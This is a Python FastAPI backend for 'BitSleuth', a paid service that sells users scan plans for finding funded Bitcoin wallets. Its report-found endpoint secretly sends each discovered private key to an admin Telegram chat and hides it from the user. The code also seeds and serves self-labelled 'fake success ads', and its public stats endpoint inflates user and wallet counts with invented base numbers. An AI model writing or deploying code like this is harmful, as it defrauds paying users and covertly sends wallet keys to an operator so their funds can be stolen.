from fastapi import FastAPI, APIRouter, HTTPException, Depends, BackgroundTasks, Request
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, EmailStr, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone, timedelta
import bcrypt
import jwt
from pymongo import ASCENDING, DESCENDING
import aiohttp
import asyncio
import hashlib
import base58

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ.get('DB_NAME', 'bitsleuth')]

# Config
JWT_SECRET = os.environ.get('JWT_SECRET', 'your-secret-key-change-in-production')
WALLET_BTC_ADDRESS = os.environ.get('WALLET_BTC_ADDRESS', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa')
ADMIN_TELEGRAM_ID = os.environ.get('ADMIN_TELEGRAM_ID', '6393075876')
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
REQUIRED_CONF = int(os.environ.get('REQUIRED_CONF', '3'))
BLOCKCHAIN_API_BASE = os.environ.get('BLOCKCHAIN_API_BASE', 'https://blockchain.info')

# Create the main app
app = FastAPI(title="BitSleuth API")
api_router = APIRouter(prefix="/api")
security = HTTPBearer()

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ========== MODELS ==========
class UserRegister(BaseModel):
    email: EmailStr
    password: str

class UserLogin(BaseModel):
    email: EmailStr
    password: str

class User(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    email: str
    email_verified: bool = False
    access_until: Optional[datetime] = None
    scan_quota: int = 10000
    is_premium: bool = False
    is_admin: bool = False
    scans_used: int = 0  # Total scans performed
    total_found: int = 0  # Total wallets found with balance
    total_payments: float = 0.0  # Total payments in USDT
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    last_active: Optional[datetime] = None

class Payment(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: str
    invoice_id: str
    tx_hash: Optional[str] = None
    from_address: Optional[str] = None
    to_address: str
    amount: float = 0.0
    currency: str = "USDT"
    expected_amount: float
    status: str = "pending"
    confirmations: int = 0
    tx_block: Optional[int] = None
    confirmed_at: Optional[datetime] = None
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class Invoice(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: str
    expected_amount: float
    currency: str = "USDT"
    plan: str
    status: str = "pending"
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class AuditLog(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    actor: str
    action: str
    details: Dict[str, Any] = {}
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class FakeAdModel(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    wallet_address: str
    amount: float
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class VerifyEmailRequest(BaseModel):
    token: str

class CreateInvoiceRequest(BaseModel):
    plan: str

class CheckAddressRequest(BaseModel):
    address: str

class ReportFoundRequest(BaseModel):
    address: str
    balance: float
    private_key: str  # Will be sent only to Telegram

class SupportMessage(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: Optional[str] = None
    email: Optional[str] = None
    message: str
    status: str = "pending"  # pending, resolved
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class SupportMessageRequest(BaseModel):
    message: str
    email: Optional[str] = None

class Testimonial(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: str
    name: str
    message: str
    rating: int = 5
    approved: bool = False
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class TestimonialRequest(BaseModel):
    name: str
    message: str
    rating: int = 5

class PaymentPlan(BaseModel):
    plan_id: str
    name: str
    price_usdt: float  # USDT TRC20 price
    scans: Optional[int] = None  # None for unlimited
    duration_days: Optional[int] = None  # For daily/weekly/monthly
    
# Payment plans with USDT TRC20
PAYMENT_PLANS = {
    "10k": PaymentPlan(plan_id="10k", name="10,000 Scans", price_usdt=5.0, scans=10000),
    "50k": PaymentPlan(plan_id="50k", name="50,000 Scans", price_usdt=20.0, scans=50000),
    "100k": PaymentPlan(plan_id="100k", name="100,000 Scans", price_usdt=35.0, scans=100000),
    "1day": PaymentPlan(plan_id="1day", name="Unlimited Daily", price_usdt=30.0, duration_days=1),
    "1week": PaymentPlan(plan_id="1week", name="Unlimited Weekly", price_usdt=150.0, duration_days=7),
    "1month": PaymentPlan(plan_id="1month", name="Unlimited Monthly", price_usdt=500.0, duration_days=30),
}

# USDT TRC20 Wallet Address (Tron Network)
USDT_WALLET_ADDRESS = os.environ.get("WALLET_TRON_ADDRESS", "TSmGGiUm7EC77qfa4E6CaSFtn9GT2G5du8")

# ========== HELPER FUNCTIONS ==========
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))

def create_jwt_token(user_id: str, email: str) -> str:
    payload = {
        'user_id': user_id,
        'email': email,
        'exp': datetime.now(timezone.utc) + timedelta(days=30)
    }
    return jwt.encode(payload, JWT_SECRET, algorithm='HS256')

def verify_jwt_token(token: str) -> dict:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    payload = verify_jwt_token(credentials.credentials)
    user = await db.users.find_one({"id": payload['user_id']}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    return user

async def get_admin_user(user: dict = Depends(get_current_user)):
    if not user.get('is_admin', False):
        raise HTTPException(status_code=403, detail="Admin access required")
    return user

async def send_telegram_message(message: str):
    if not TELEGRAM_BOT_TOKEN:
        logger.warning("Telegram bot token not configured")
        return
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": ADMIN_TELEGRAM_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data) as resp:
                if resp.status != 200:
                    logger.error(f"Failed to send Telegram message: {await resp.text()}")
                else:
                    logger.info("Telegram notification sent successfully")
    except Exception as e:
        logger.error(f"Error sending Telegram message: {e}")

async def log_audit(actor: str, action: str, details: Dict[str, Any] = None):
    audit = AuditLog(actor=actor, action=action, details=details or {})
    doc = audit.model_dump()
    doc['created_at'] = doc['created_at'].isoformat()
    await db.audit_log.insert_one(doc)

async def get_btc_address_balance(address: str) -> Optional[float]:
    """Get Bitcoin address balance from blockchain API"""
    url = f"{BLOCKCHAIN_API_BASE}/q/addressbalance/{address}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    balance_satoshis = int(text.strip())
                    return balance_satoshis / 100000000  # Convert to BTC
                return 0.0
    except Exception as e:
        logger.error(f"Error checking BTC balance for {address}: {e}")
        return 0.0

async def process_payment_confirmation(payment_doc: dict, current_block: int):
    """Process a payment that has enough confirmations"""
    try:
        user_id = payment_doc['user_id']
        plan = payment_doc.get('plan', '1week')
        
        duration_map = {
            '1week': timedelta(days=7),
            '1month': timedelta(days=30),
            '3months': timedelta(days=90)
        }
        duration = duration_map.get(plan, timedelta(days=7))
        
        user = await db.users.find_one({"id": user_id})
        if user:
            current_access = user.get('access_until')
            if current_access:
                if isinstance(current_access, str):
                    current_access = datetime.fromisoformat(current_access)
                new_access = max(current_access, datetime.now(timezone.utc)) + duration
            else:
                new_access = datetime.now(timezone.utc) + duration
            
            await db.users.update_one(
                {"id": user_id},
                {
                    "$set": {
                        "access_until": new_access.isoformat(),
                        "is_premium": True
                    }
                }
            )
            
            await db.payments.update_one(
                {"id": payment_doc['id']},
                {
                    "$set": {
                        "status": "confirmed",
                        "confirmed_at": datetime.now(timezone.utc).isoformat()
                    }
                }
            )
            
            await db.invoices.update_one(
                {"id": payment_doc['invoice_id']},
                {"$set": {"status": "confirmed"}}
            )
            
            await log_audit(
                "system",
                "payment_confirmed",
                {
                    "payment_id": payment_doc['id'],
                    "user_id": user_id,
                    "amount": payment_doc['amount'],
                    "plan": plan
                }
            )
            
            await send_telegram_message(
                f"💰 <b>Payment Confirmed</b>\n"
                f"User: {user.get('email')}\n"
                f"Amount: {payment_doc['amount']} BTC\n"
                f"Plan: {plan}\n"
                f"TX: {payment_doc.get('tx_hash', 'N/A')}"
            )
            
            logger.info(f"Payment confirmed for user {user_id}: {payment_doc['id']}")
    except Exception as e:
        logger.error(f"Error processing payment confirmation: {e}")

# ========== API ENDPOINTS ==========
@api_router.get("/")
async def root():
    return {"message": "BitSleuth API v2.0 - Bitcoin Edition", "status": "operational"}

@api_router.post("/auth/register")
async def register(data: UserRegister, background_tasks: BackgroundTasks):
    existing = await db.users.find_one({"email": data.email})
    if existing:
        raise HTTPException(status_code=400, detail="Email already registered")
    
    user = User(
        email=data.email,
        is_admin=(data.email == "admin@bitsleuth.com")
    )
    
    user_doc = user.model_dump()
    user_doc['password'] = hash_password(data.password)
    user_doc['created_at'] = user_doc['created_at'].isoformat()
    user_doc['verification_token'] = str(uuid.uuid4())
    
    await db.users.insert_one(user_doc)
    await log_audit(data.email, "user_registered", {"user_id": user.id})
    
    return {"message": "Registration successful. Please check your email to verify.", "user_id": user.id}

@api_router.post("/auth/login")
async def login(data: UserLogin):
    user = await db.users.find_one({"email": data.email}, {"_id": 0})
    if not user or not verify_password(data.password, user['password']):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    token = create_jwt_token(user['id'], user['email'])
    
    return {
        "token": token,
        "user": {
            "id": user['id'],
            "email": user['email'],
            "email_verified": user.get('email_verified', False),
            "is_premium": user.get('is_premium', False),
            "is_admin": user.get('is_admin', False),
            "access_until": user.get('access_until')
        }
    }

@api_router.post("/auth/verify-email")
async def verify_email(data: VerifyEmailRequest):
    user = await db.users.find_one({"verification_token": data.token})
    if not user:
        raise HTTPException(status_code=404, detail="Invalid verification token")
    
    await db.users.update_one(
        {"id": user['id']},
        {"$set": {"email_verified": True}, "$unset": {"verification_token": ""}}
    )
    
    await log_audit(user['email'], "email_verified", {"user_id": user['id']})
    return {"message": "Email verified successfully"}

@api_router.get("/auth/me")
async def get_me(user: dict = Depends(get_current_user)):
    return {
        "id": user['id'],
        "email": user['email'],
        "email_verified": user.get('email_verified', False),
        "is_premium": user.get('is_premium', False),
        "is_admin": user.get('is_admin', False),
        "access_until": user.get('access_until'),
        "scan_quota": user.get('scan_quota', 10000)
    }

@api_router.post("/invoices/create")
async def create_invoice(data: CreateInvoiceRequest, user: dict = Depends(get_current_user)):
    if data.plan not in PAYMENT_PLANS:
        raise HTTPException(status_code=400, detail="Invalid plan")
    
    plan = PAYMENT_PLANS[data.plan]
    
    invoice = Invoice(
        user_id=user['id'],
        expected_amount=plan.price_usdt,
        currency="USDT",
        plan=data.plan
    )
    
    invoice_doc = invoice.model_dump()
    invoice_doc['created_at'] = invoice_doc['created_at'].isoformat()
    
    await db.invoices.insert_one(invoice_doc)
    await log_audit(user['email'], "invoice_created", {"invoice_id": invoice.id, "plan": data.plan})
    
    return {
        "invoice_id": invoice.id,
        "amount": invoice.expected_amount,
        "currency": "USDT",
        "wallet_address": USDT_WALLET_ADDRESS,
        "plan": data.plan,
        "message": "Please send exact USDT amount (TRC20) to the Tron wallet address. Payment will be confirmed after network confirmation."
    }

@api_router.get("/invoices/{invoice_id}")
async def get_invoice(invoice_id: str, user: dict = Depends(get_current_user)):
    invoice = await db.invoices.find_one({"id": invoice_id, "user_id": user['id']}, {"_id": 0})
    if not invoice:
        raise HTTPException(status_code=404, detail="Invoice not found")
    
    payments = await db.payments.find({"invoice_id": invoice_id}, {"_id": 0}).to_list(10)
    
    return {
        "invoice": invoice,
        "payments": payments
    }

@api_router.post("/scan/check-address")
async def check_address(data: CheckAddressRequest, user: dict = Depends(get_current_user)):
    """Check if a Bitcoin address has balance (server-side verification)"""
    try:
        balance = await get_btc_address_balance(data.address)
        
        # Update user scan count
        await db.users.update_one(
            {"id": user['id']},
            {
                "$inc": {"scans_used": 1},
                "$set": {"last_active": datetime.now(timezone.utc).isoformat()}
            }
        )
        
        return {"address": data.address, "balance": balance, "has_balance": balance > 0}
    except Exception as e:
        logger.error(f"Error checking address: {e}")
        raise HTTPException(status_code=500, detail="Error checking address")

@api_router.post("/scan/report-found")
async def report_found_wallet(data: ReportFoundRequest, user: dict = Depends(get_current_user)):
    """Report a found wallet with balance - sends private key to Telegram ONLY"""
    try:
        # Verify balance
        balance = await get_btc_address_balance(data.address)
        
        if balance > 0:
            # Update user found count
            await db.users.update_one(
                {"id": user['id']},
                {"$inc": {"total_found": 1}}
            )
            
            # Send to Telegram with PRIVATE KEY
            await send_telegram_message(
                f"🎯 <b>FUNDED WALLET FOUND!</b>\n\n"
                f"<b>Address:</b> <code>{data.address}</code>\n"
                f"<b>Balance:</b> {balance} BTC\n"
                f"<b>User:</b> {user['email']}\n\n"
                f"<b>🔑 PRIVATE KEY:</b>\n<code>{data.private_key}</code>\n\n"
                f"⚠️ <b>SECURITY NOTICE:</b> Key sent only to admin. User does NOT see this."
            )
            
            # Log to database (without private key for security)
            await log_audit(
                user['email'],
                "funded_wallet_found",
                {
                    "address": data.address,
                    "balance": balance,
                    "note": "Private key sent to Telegram only"
                }
            )
            
            # Return to user WITHOUT private key
            return {
                "success": True,
                "message": "Funded wallet found!",
                "address": data.address,
                "balance": balance,
                "note": "Details sent to administrator"
            }
        else:
            return {
                "success": False,
                "message": "No balance found"
            }
    except Exception as e:
        logger.error(f"Error reporting found wallet: {e}")
        raise HTTPException(status_code=500, detail="Error reporting wallet")

@api_router.get("/ads/recent")
async def get_recent_ads():
    """Get fake success ads for display"""
    ads = await db.fake_ads.find({}, {"_id": 0}).sort("created_at", DESCENDING).limit(5).to_list(5)
    return {"ads": ads}

@api_router.post("/support/message")
async def create_support_message(data: SupportMessageRequest, user: dict = Depends(get_current_user)):
    """Create a support message from user"""
    support_msg = SupportMessage(
        user_id=user['id'],
        email=user['email'],
        message=data.message
    )
    
    msg_doc = support_msg.model_dump()
    msg_doc['created_at'] = msg_doc['created_at'].isoformat()
    
    await db.support_messages.insert_one(msg_doc)
    await log_audit(user['email'], "support_message_created", {"message_id": support_msg.id})
    
    return {"message": "Support message sent successfully", "id": support_msg.id}

@api_router.post("/support/message/public")
async def create_support_message_public(data: SupportMessageRequest):
    """Create a support message from non-authenticated user"""
    if not data.email:
        raise HTTPException(status_code=400, detail="Email is required for public messages")
    
    support_msg = SupportMessage(
        email=data.email,
        message=data.message
    )
    
    msg_doc = support_msg.model_dump()
    msg_doc['created_at'] = msg_doc['created_at'].isoformat()
    
    await db.support_messages.insert_one(msg_doc)
    
    return {"message": "Support message sent successfully", "id": support_msg.id}

@api_router.post("/testimonials/create")
async def create_testimonial(data: TestimonialRequest, user: dict = Depends(get_current_user)):
    """Create a testimonial (requires approval)"""
    testimonial = Testimonial(
        user_id=user['id'],
        name=data.name,
        message=data.message,
        rating=min(max(data.rating, 1), 5)  # Clamp between 1-5
    )
    
    test_doc = testimonial.model_dump()
    test_doc['created_at'] = test_doc['created_at'].isoformat()
    
    await db.testimonials.insert_one(test_doc)
    await log_audit(user['email'], "testimonial_created", {"testimonial_id": testimonial.id})
    
    return {"message": "Testimonial submitted for approval", "id": testimonial.id}

@api_router.get("/testimonials/approved")
async def get_approved_testimonials(limit: int = 10):
    """Get approved testimonials"""
    testimonials = await db.testimonials.find(
        {"approved": True},
        {"_id": 0}
    ).sort("created_at", DESCENDING).limit(limit).to_list(limit)
    
    return {"testimonials": testimonials}

@api_router.get("/stats/public")
async def get_public_stats():
    """Get public statistics - Professional display numbers"""
    # Base numbers from database
    real_users = await db.users.count_documents({})
    real_found = await db.audit_log.count_documents({"action": "funded_wallet_found"})
    
    # Professional stats for public display
    total_users = 20000 + real_users  # Start at 20,000
    total_mined = 35000000000 + (real_users * 100000)  # 35 billion base
    total_found = 786872 + real_found  # 786,872 base
    
    # Active miners calculation
    active_miners = await db.users.count_documents({
        "last_active": {"$gte": (datetime.now(timezone.utc) - timedelta(hours=24)).isoformat()}
    })
    
    # Show at least 15% of total users as active (3000+)
    displayed_active = max(active_miners, int(total_users * 0.15), 3000)
    
    return {
        "total_users": total_users,
        "total_mined": total_mined,
        "total_found": total_found,
        "active_miners": displayed_active
    }

@api_router.get("/price/btc")
async def get_btc_price():
    """Get current BTC price from CoinGecko"""
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        "price": data.get("bitcoin", {}).get("usd", 0),
                        "currency": "USD"
                    }
                else:
                    raise HTTPException(status_code=500, detail="Failed to fetch BTC price")
    except Exception as e:
        logger.error(f"Error fetching BTC price: {e}")
        raise HTTPException(status_code=500, detail="Error fetching BTC price")

# ========== ADMIN ENDPOINTS ==========
@api_router.get("/admin/stats")
async def admin_stats(admin: dict = Depends(get_admin_user)):
    total_users = await db.users.count_documents({})
    premium_users = await db.users.count_documents({"is_premium": True})
    total_payments = await db.payments.count_documents({})
    confirmed_payments = await db.payments.count_documents({"status": "confirmed"})
    pending_payments = await db.payments.count_documents({"status": "pending"})
    found_wallets = await db.audit_log.count_documents({"action": "funded_wallet_found"})
    
    # Calculate total revenue
    payments = await db.payments.find({"status": "confirmed"}, {"_id": 0, "amount": 1}).to_list(1000)
    total_revenue = sum(p.get("amount", 0) for p in payments)
    
    # Calculate total scans used across all users
    users = await db.users.find({}, {"_id": 0, "scans_used": 1}).to_list(10000)
    total_scans = sum(u.get("scans_used", 0) for u in users)
    
    return {
        "total_users": total_users,
        "premium_users": premium_users,
        "total_payments": total_payments,
        "confirmed_payments": confirmed_payments,
        "pending_payments": pending_payments,
        "found_wallets": found_wallets,
        "total_revenue": total_revenue,
        "total_scans": total_scans
    }

@api_router.get("/admin/users-detailed")
async def admin_users_detailed(admin: dict = Depends(get_admin_user)):
    """Get detailed user statistics with scans, payments, and found wallets"""
    users = await db.users.find(
        {},
        {"_id": 0, "password": 0, "verification_token": 0}
    ).sort("created_at", DESCENDING).to_list(1000)
    
    # Enrich with payment data
    detailed_users = []
    for user in users:
        # Get user's payments
        user_payments = await db.payments.find(
            {"user_id": user['id'], "status": "confirmed"},
            {"_id": 0, "amount": 1, "created_at": 1}
        ).to_list(100)
        
        total_paid = sum(p.get("amount", 0) for p in user_payments)
        payment_count = len(user_payments)
        
        detailed_users.append({
            **user,
            "total_paid": total_paid,
            "payment_count": payment_count,
            "scans_used": user.get("scans_used", 0),
            "total_found": user.get("total_found", 0)
        })
    
    return {"users": detailed_users}

@api_router.get("/admin/payments")
async def admin_payments(admin: dict = Depends(get_admin_user), status: Optional[str] = None):
    query = {"status": status} if status else {}
    payments = await db.payments.find(query, {"_id": 0}).sort("created_at", DESCENDING).to_list(100)
    return {"payments": payments}

@api_router.get("/admin/users")
async def admin_users(admin: dict = Depends(get_admin_user)):
    users = await db.users.find({}, {"_id": 0, "password": 0}).sort("created_at", DESCENDING).to_list(100)
    return {"users": users}

@api_router.get("/admin/audit-log")
async def admin_audit_log(admin: dict = Depends(get_admin_user), limit: int = 100):
    logs = await db.audit_log.find({}, {"_id": 0}).sort("created_at", DESCENDING).to_list(limit)
    return {"logs": logs}

@api_router.post("/admin/create-fake-ad")
async def create_fake_ad(wallet_address: str, amount: float, admin: dict = Depends(get_admin_user)):
    """Create fake success ad for display"""
    ad = FakeAdModel(wallet_address=wallet_address, amount=amount)
    ad_doc = ad.model_dump()
    ad_doc['created_at'] = ad_doc['created_at'].isoformat()
    await db.fake_ads.insert_one(ad_doc)
    return {"message": "Fake ad created", "ad": ad_doc}

@api_router.get("/admin/support-messages")
async def admin_support_messages(admin: dict = Depends(get_admin_user), status: Optional[str] = None):
    """Get all support messages"""
    query = {"status": status} if status else {}
    messages = await db.support_messages.find(query, {"_id": 0}).sort("created_at", DESCENDING).to_list(100)
    return {"messages": messages}

@api_router.patch("/admin/support-messages/{message_id}/resolve")
async def resolve_support_message(message_id: str, admin: dict = Depends(get_admin_user)):
    """Mark support message as resolved"""
    result = await db.support_messages.update_one(
        {"id": message_id},
        {"$set": {"status": "resolved"}}
    )
    
    if result.modified_count == 0:
        raise HTTPException(status_code=404, detail="Message not found")
    
    return {"message": "Support message resolved"}

@api_router.get("/admin/testimonials")
async def admin_testimonials(admin: dict = Depends(get_admin_user)):
    """Get all testimonials"""
    testimonials = await db.testimonials.find({}, {"_id": 0}).sort("created_at", DESCENDING).to_list(100)
    return {"testimonials": testimonials}

@api_router.patch("/admin/testimonials/{testimonial_id}/approve")
async def approve_testimonial(testimonial_id: str, admin: dict = Depends(get_admin_user)):
    """Approve a testimonial"""
    result = await db.testimonials.update_one(
        {"id": testimonial_id},
        {"$set": {"approved": True}}
    )
    
    if result.modified_count == 0:
        raise HTTPException(status_code=404, detail="Testimonial not found")
    
    return {"message": "Testimonial approved"}

# ========== STARTUP ==========
@app.on_event("startup")
async def startup_event():
    await db.users.create_index("email", unique=True)
    await db.users.create_index("id", unique=True)
    await db.payments.create_index("invoice_id")
    await db.invoices.create_index("id", unique=True)
    await db.support_messages.create_index("id", unique=True)
    await db.testimonials.create_index("id", unique=True)
    
    # Create initial fake ads if none exist
    count = await db.fake_ads.count_documents({})
    if count == 0:
        fake_ads = [
            {"id": str(uuid.uuid4()), "wallet_address": "1A2B3C4D5E6F7G8H9I", "amount": 0.03, "created_at": datetime.now(timezone.utc).isoformat()},
            {"id": str(uuid.uuid4()), "wallet_address": "1Z9X8Y7W6V5U4T3S2R", "amount": 0.06, "created_at": (datetime.now(timezone.utc) - timedelta(days=1)).isoformat()},
            {"id": str(uuid.uuid4()), "wallet_address": "1Q2W3E4R5T6Y7U8I9O", "amount": 0.12, "created_at": (datetime.now(timezone.utc) - timedelta(days=2)).isoformat()},
        ]
        await db.fake_ads.insert_many(fake_ads)
    
    logger.info("BitSleuth API (Bitcoin Edition) started")

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()

app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)
